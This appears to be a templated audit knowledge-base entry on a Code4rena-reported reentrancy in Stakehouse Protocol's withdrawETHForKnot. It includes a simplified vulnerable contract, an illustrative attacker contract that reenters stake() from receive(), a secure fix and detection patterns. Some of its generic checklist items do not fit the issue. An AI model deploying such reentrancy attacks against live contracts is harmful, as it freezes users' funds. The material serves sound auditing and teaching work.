---
# Core Classification
protocol: Stakehouse Protocol
chain: ethereum
category: amm
vulnerability_type: reentrancy_fund_freeze

# Attack Vector Details
attack_type: reentrancy
affected_component: staking_lifecycle

# Source Information
source: reports/constantproduct/h-11-protocol-insolvent-permanent-freeze-of-funds.md
audit_firm: Code4rena
severity: high

# Impact Classification
impact: permanent_fund_freeze
exploitability: 1.0
financial_impact: high

# Context Tags
tags:
  - reentrancy
  - fund_freeze
  - lifecycle_state
  - protocol_insolvency

# Version Info
language: solidity
version: all

# Pattern Identity (Required)
root_cause_family: logic_error
pattern_key: logic_error | staking_lifecycle | reentrancy_fund_freeze

# Interaction Scope (Required for multi-contract or multi-path issues)
interaction_scope: multi_contract

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - attack
  - deposit
  - msg.sender
  - receive
  - stake
  - transition
  - withdraw
  - withdrawETHForKnot
---

## References & Source Reports

| Label | Path | Severity | Auditor | Source ID / Link |
|-------|------|----------|---------|------------------|
| [Stakehouse Protocol] | reports/constantproduct/h-11-protocol-insolvent-permanent-freeze-of-funds.md | HIGH | Code4rena | - |


# Stakehouse Protocol - Reentrancy Lifecycle State Attack

## Unique Protocol Issue

**Protocol**: Stakehouse Protocol  
**Audit Firm**: Code4rena  
**Severity**: HIGH  
**Source**: `reports/constantproduct/h-11-protocol-insolvent-permanent-freeze-of-funds.md`

## Overview

Stakehouse Protocol's staking lifecycle had a reentrancy vulnerability in `withdrawETHForKnot` that allowed a node runner to reenter during ETH withdrawal and call `stake()`. This changed the BLS key's lifecycle status to `DEPOSIT_COMPLETE` while user funds were still in the vault, causing the key to be banned and permanently freezing user deposits.



#### Agent Quick View

- Root cause statement: "This vulnerability exists because of logic_error"
- Pattern key: `logic_error | staking_lifecycle | reentrancy_fund_freeze`
- Interaction scope: `multi_contract`
- Primary affected component(s): `staking_lifecycle`
- High-signal code keywords: `attack`, `deposit`, `msg.sender`, `receive`, `stake`, `transition`, `withdraw`, `withdrawETHForKnot`
- Typical sink / impact: `permanent_fund_freeze`
- Validation strength: `moderate`

#### Contract / Boundary Map

- Entry surface(s): See pattern-specific attack scenarios below
- Contract hop(s): `LiquidStakingManager.function -> SecureLiquidStakingManager.function -> StakehouseAttacker.function`
- Trust boundary crossed: `callback / external call`
- Shared state or sync assumption: `state consistency across operations`

#### Valid Bug Signals

- Signal 1: State variable updated after external interaction instead of before (CEI violation)
- Signal 2: Withdrawal path produces different accounting than deposit path for same principal
- Signal 3: Reward accrual continues during paused/emergency state
- Signal 4: Edge case in state machine transition allows invalid state

#### False Positive Guards

- Not this bug when: Standard security patterns (access control, reentrancy guards, input validation) are in place
- Safe if: Protocol behavior matches documented specification
- Requires attacker control of: specific conditions per pattern

## Why This Is Unique

Stakehouse's complex lifecycle state machine combined with reentrancy created a novel attack:
1. **State Machine Corruption**: Lifecycle status changed out of order
2. **BLS Key Banning**: Key becomes unusable after attack
3. **Fund Freeze**: User ETH locked in vaults with no withdrawal path
4. **Protocol Insolvency**: Users cannot receive funds, rewards, or rotate tokens

## Vulnerable Architecture

```
Normal Lifecycle:
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ REGISTER_BLS │ -> │ DEPOSIT_NODE │ -> │ DEPOSIT_USER │ ->
└──────────────┘    │  (4 ETH)     │    │  (24 ETH)    │
                    └──────────────┘    └──────────────┘
                           │                    │
                           v                    v
                    ┌──────────────┐    ┌──────────────┐
                    │ WITHDRAW_ETH │    │ STAKE_FUNDS  │
                    │  (reenters)  │    │  (corrupts)  │
                    └──────────────┘    └──────────────┘
```

## Vulnerable Code Pattern

```solidity
// ❌ VULNERABLE: No reentrancy guard, status check after ETH transfer
contract LiquidStakingManager {
    function withdrawETHForKnot(bytes calldata _blsPubKey) external {
        // Check current status
        require(
            getBLSKeyStatus(_blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
            "Invalid status"
        );
        
        // Get node runner's deposit
        uint256 nodeRunnerDeposit = 4 ether;
        
        // Transfer ETH to node runner - REENTRANCY POINT!
        (bool success,) = msg.sender.call{value: nodeRunnerDeposit}("");
        require(success, "Transfer failed");
        
        // Status NOT updated here - vulnerability!
        // Node runner can reenter during callback
    }
    
    function stake(bytes calldata _blsPubKey) external {
        // Attacker calls this during reentrancy!
        // Uses 24 ETH from user deposits + some ETH
        require(
            getBLSKeyStatus(_blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
            "Invalid status"
        );
        
        // Execute staking with user funds
        _doStake(_blsPubKey);
        
        // Update status - CORRUPTS STATE!
        _setBLSKeyStatus(_blsPubKey, IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE);
        
        // BLS key is now considered "staked" but:
        // - Node runner withdrew their 4 ETH
        // - User 24 ETH is locked
        // - Validator cannot actually run
        // - Key gets BANNED
    }
}
```

## Attack Scenario

```solidity
contract StakehouseAttacker {
    LiquidStakingManager lsm;
    bytes blsPubKey;
    bool hasReentered;
    
    function attack(bytes calldata _blsPubKey) external {
        blsPubKey = _blsPubKey;
        hasReentered = false;
        
        // 1. Register as node runner, deposit 4 ETH, get BLS key registered
        // 2. Wait for users to deposit 24 ETH to the vault
        // 3. Call withdraw to trigger reentrancy
        lsm.withdrawETHForKnot(_blsPubKey);
    }
    
    receive() external payable {
        if (!hasReentered) {
            hasReentered = true;
            
            // 4. During ETH callback, call stake()
            // This uses user's 24 ETH + triggers lifecycle change
            lsm.stake(blsPubKey);
            
            // 5. After this:
            // - Node runner has their 4 ETH back
            // - Status is DEPOSIT_COMPLETE
            // - But validator never actually started
            // - Key gets BANNED
            // - User funds FROZEN FOREVER
        }
    }
}
```

## State Machine Corruption Flow

```
Step 1: Node runner registers BLS key
- Status: INITIALS_REGISTERED
- Node deposit: 4 ETH in contract
- User deposit: 0

Step 2: Users deposit to vault
- Status: INITIALS_REGISTERED (unchanged)
- Node deposit: 4 ETH
- User deposit: 24 ETH

Step 3: Node runner calls withdrawETHForKnot
- 4 ETH sent to node runner (triggers receive())
- Status: INITIALS_REGISTERED (not yet updated)

Step 4: In receive() callback, attacker calls stake()
- Status check passes (still INITIALS_REGISTERED)
- User's 24 ETH used for "staking"
- Status: DEPOSIT_COMPLETE

Step 5: withdrawETHForKnot returns
- Node runner has 4 ETH
- Status: DEPOSIT_COMPLETE (corrupted)
- BLS key is banned (invalid staking)
- User 24 ETH frozen forever
```

## Impact

- **Permanent Fund Freeze**: User ETH cannot be withdrawn
- **Protocol Insolvency**: Protocol cannot pay users
- **No Recovery Path**: Banned BLS key cannot be reactivated
- **Reward Loss**: Users cannot receive staking rewards
- **Token Rotation Blocked**: Cannot rotate to another validator

## Secure Implementation

```solidity
// ✅ SECURE: Reentrancy guard + status update before transfer
contract SecureLiquidStakingManager is ReentrancyGuard {
    mapping(bytes => uint256) public nodeRunnerDeposits;
    
    function withdrawETHForKnot(bytes calldata _blsPubKey) 
        external 
        nonReentrant  // Reentrancy guard
    {
        require(
            getBLSKeyStatus(_blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
            "Invalid status"
        );
        
        // Update state BEFORE transfer (CEI pattern)
        uint256 deposit = nodeRunnerDeposits[_blsPubKey];
        nodeRunnerDeposits[_blsPubKey] = 0;
        
        // Change status BEFORE transfer
        _setBLSKeyStatus(_blsPubKey, IDataStructures.LifecycleStatus.WITHDRAWN);
        
        // Transfer ETH last
        (bool success,) = msg.sender.call{value: deposit}("");
        require(success, "Transfer failed");
    }
    
    function stake(bytes calldata _blsPubKey) 
        external 
        nonReentrant  // Also guarded
    {
        // Status check will fail if called during withdrawal
        require(
            getBLSKeyStatus(_blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
            "Invalid status"
        );
        
        _doStake(_blsPubKey);
        _setBLSKeyStatus(_blsPubKey, IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE);
    }
}
```

## Detection Patterns

```solidity
// RED FLAGS:

// 1. ETH transfer without reentrancy guard
msg.sender.call{value: amount}("");  // No nonReentrant

// 2. State update after external call
msg.sender.call{value: amount}("");
status = COMPLETED;  // CEI violation

// 3. Multiple functions modifying same state without guards
function withdraw() { status = X; }  // No guard
function stake() { status = Y; }     // No guard

// 4. Complex state machines with external calls
function transition() {
    // Call external, then change state
    external.call();
    stateMachine = newState;  // Dangerous
}
```

## Lessons for Auditors

1. **Reentrancy + State Machines**: Especially dangerous combination
2. **CEI Pattern**: Always update state before external calls
3. **ReentrancyGuard**: Apply to ALL functions that share state
4. **State Transitions**: Map all possible transition paths
5. **Fund Recovery**: Ensure recovery paths exist for all states

## Keywords

`reentrancy`, `fund_freeze`, `lifecycle_state`, `protocol_insolvency`, `stakehouse`, `state_machine_corruption`, `BLS_key`, `CEI_pattern`, `nonReentrant`

### Detection Patterns

#### Code Patterns to Look For
```
- See vulnerable pattern examples above for specific code smells
- Check for missing validation on critical state-changing operations
- Look for assumptions about external component behavior
```

#### Audit Checklist
- [ ] Verify all state-changing functions have appropriate access controls
- [ ] Check for CEI pattern compliance on external calls
- [ ] Validate arithmetic operations for overflow/underflow/precision loss
- [ ] Confirm oracle data freshness and sanity checks

### Keywords for Search

> These keywords enhance vector search retrieval:

`amm`, `attack`, `deposit`, `fund_freeze`, `lifecycle_state`, `msg.sender`, `protocol_insolvency`, `receive`, `reentrancy`, `reentrancy_fund_freeze`, `stake`, `transition`, `withdraw`, `withdrawETHForKnot`
